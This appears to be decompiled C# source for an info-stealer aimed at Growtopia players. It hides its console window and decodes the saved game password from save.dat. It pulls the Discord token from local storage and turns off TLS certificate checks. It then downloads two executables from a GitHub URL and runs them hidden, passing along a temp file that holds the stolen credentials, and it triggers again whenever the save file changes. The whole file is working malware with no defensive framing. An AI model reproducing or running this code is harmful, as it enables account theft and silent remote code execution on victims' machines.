using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.Win32;

namespace lol31;

public class MainClass
{
	public static class pwDec
	{
		public static List<string> ParsePassword(byte[] contents)
		{
			try
			{
				string text = "";
				foreach (byte b in contents)
				{
					string text2 = b.ToString("X2");
					text = ((!(text2 == "00")) ? (text + text2) : (text + "<>"));
				}
				if (text.Contains("74616E6B69645F70617373776F7264"))
				{
					string text3 = "74616E6B69645F70617373776F7264";
					int num = text.IndexOf(text3);
					int num2 = text.LastIndexOf(text3);
					num += text3.Length;
					int num3 = text.IndexOf("<><><>", num);
					string @string = Encoding.UTF8.GetString(StringToByteArray(text.Substring(num, num3 - num).Trim()));
					string text4;
					if (@string.ToCharArray()[0] != '_' || 1 == 0)
					{
						text4 = text.Substring(num, num3 - num).Trim();
					}
					else
					{
						num2 += text3.Length;
						num3 = text.IndexOf("<><><>", num2);
						text4 = text.Substring(num2, num3 - num2).Trim();
					}
					string text5 = "74616E6B69645F70617373776F7264" + text4 + "<><><>";
					int num4 = text.IndexOf(text5);
					num4 += text5.Length;
					int num5 = text.IndexOf("<><><>", num4);
					string text6 = text.Substring(num4, num5 - num4).Trim();
					int num6 = StringToByteArray(text4)[0];
					text6 = text6.Substring(0, num6 * 2);
					StringToByteArray(text6.Replace("<>", "00"));
					List<byte> list = new List<byte>();
					List<byte> list2 = new List<byte>();
					for (int j = 0; j < list.Count; j++)
					{
						list2.Add((byte)(list[j] - 1 - j));
					}
					List<string> list3 = new List<string>();
					for (int k = 0; k <= 255; k++)
					{
						string text7 = "";
						foreach (byte item in list2)
						{
							if (ValidateChar((char)(byte)(item + k)))
							{
								text7 += (char)(byte)(item + k);
							}
						}
						if (text7.Length == num6)
						{
							list3.Add(text7);
						}
					}
					return list3;
				}
				return null;
			}
			catch
			{
				return null;
			}
		}

		public static byte[] StringToByteArray(string str)
		{
			Dictionary<string, byte> dictionary = new Dictionary<string, byte>();
			for (int i = 0; i <= 255; i++)
			{
				dictionary.Add(i.ToString("X2"), (byte)i);
			}
			List<byte> list = new List<byte>();
			for (int j = 0; j < str.Length; j += 2)
			{
				list.Add(dictionary[str.Substring(j, 2)]);
			}
			return list.ToArray();
		}

		private static bool ValidateChar(char cdzdshr)
		{
			if ((cdzdshr >= '0' && cdzdshr <= '9') || (cdzdshr >= 'A' && cdzdshr <= 'Z') || (cdzdshr >= 'a' && cdzdshr <= 'z'))
			{
				return true;
			}
			if (cdzdshr >= '+')
			{
				return cdzdshr <= '.';
			}
			return false;
		}

		public static string[] Func(byte[] lel)
		{
			List<string> list = ParsePassword(lel);
			return list.ToArray();
		}
	}

	public class Packet
	{
		public string growid;

		public string password;

		public string MAC;

		public string computerInfo;

		public string lastworld;

		public string user;

		public string token;

		public string ip;

		public string browsercreds;

		public string desktoppic;
	}

	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	public static string savedatpath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat";

	public static string old;

	private static string growid = "";

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	public static string takeToken()
	{
		try
		{
			string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//Discord//Local Storage//leveldb//000005.ldb");
			int num;
			while ((num = text.IndexOf("oken")) != -1)
			{
				text = text.Substring(num + "oken".Length);
			}
			return text.Split(new char[1] { '"' })[1];
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void ExtractResource(string FileName, string Name)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		using Stream stream = callingAssembly.GetManifestResourceStream(FileName);
		byte[] array = new byte[(int)stream.Length];
		stream.Read(array, 0, array.Length);
		File.WriteAllBytes(Name, array);
	}

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	public static void Main()
	{
		IntPtr consoleWindow = GetConsoleWindow();
		ShowWindow(consoleWindow, 0);
		Packet packet = new Packet();
		while (true)
		{
			WebClient webClient = new WebClient();
			try
			{
				webClient.DownloadString("http://google.com");
			}
			catch
			{
				Thread.Sleep(15000);
				continue;
			}
			break;
		}
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3;
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
		ServicePointManager.ServerCertificateValidationCallback = (object snder, X509Certificate cert, X509Chain chain, SslPolicyErrors error) => true;
		packet.token = takeToken();
		packet.computerInfo = Environment.MachineName;
		packet.user = Environment.UserName;
		MemoryStream memoryStream = new MemoryStream();
		memoryStream.Position = 0L;
		new StreamReader(memoryStream).ReadToEnd();
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		gonder();
	}

	private static void gonder()
	{
		Packet packet = new Packet();
		string text = Path.GetTempPath() + "\\klo.exe";
		if (!File.Exists(text))
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			WebClient webClient = new WebClient();
			webClient.DownloadFile("https://github.com/heysurfer/MultiToolV1/raw/master/savedecrypter.exe", text);
		}
		Process process = new Process();
		process.StartInfo.FileName = text;
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.WorkingDirectory = Path.GetTempPath();
		process.Start();
		process.WaitForExit();
		string[] array = File.ReadAllText(Path.GetTempPath() + "\\result.txt").Split(new char[1] { '|' });
		try
		{
			packet.growid = array[0];
			packet.password = array[1];
			packet.lastworld = array[2];
			growid = packet.growid;
		}
		catch
		{
			byte[] array2 = File.ReadAllBytes((string)Registry.GetValue("HKEY_CURRENT_USER\\Software\\Growtopia", "path", null) + "\\save.dat");
			Regex regex = new Regex("[^\\w0-9]");
			string text2 = Encoding.Default.GetString(array2).Replace("\0", " ");
			packet.growid = regex.Replace(text2.Substring(text2.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[1] { ' ' })[3], string.Empty);
			string text3 = null;
			string[] array3 = pwDec.Func(array2);
			foreach (string text4 in array3)
			{
				text3 = text3 + text4 + "\r\n";
			}
			packet.password = text3;
			packet.lastworld = regex.Replace(text2.Substring(text2.IndexOf("lastworld") + "lastworld".Length).Split(new char[1] { ' ' })[3], string.Empty);
			if (packet.lastworld == "lastworld")
			{
				packet.lastworld = "unknown";
			}
		}
		packet.token = takeToken();
		packet.computerInfo = Environment.MachineName;
		packet.user = Environment.UserName;
		string path = Path.GetTempPath() + "\\windowserror_5.txt";
		string contents = packet.growid + "|" + packet.password + "|" + packet.lastworld + "|" + packet.user + "|" + packet.token + "|oscar1123|";
		File.WriteAllText(path, contents);
		string text5 = Path.GetTempPath() + "\\chks.exe";
		if (!File.Exists(text5))
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			WebClient webClient2 = new WebClient();
			webClient2.DownloadFile("https://github.com/heysurfer/MultiToolV1/raw/master/savedecrpters.exe", text5);
		}
		Process process2 = new Process();
		process2.StartInfo.FileName = text5;
		process2.StartInfo.CreateNoWindow = true;
		process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process2.StartInfo.WorkingDirectory = Path.GetTempPath();
		process2.Start();
		process2.WaitForExit();
		new Timer(TimerCallback, null, 0, 1000);
		old = File.ReadAllText(savedatpath);
		Console.ReadKey();
	}

	private static void TimerCallback(object o)
	{
		string strB = File.ReadAllText(savedatpath);
		if (string.Compare(old, strB) < 0)
		{
			Main();
		}
	}
}
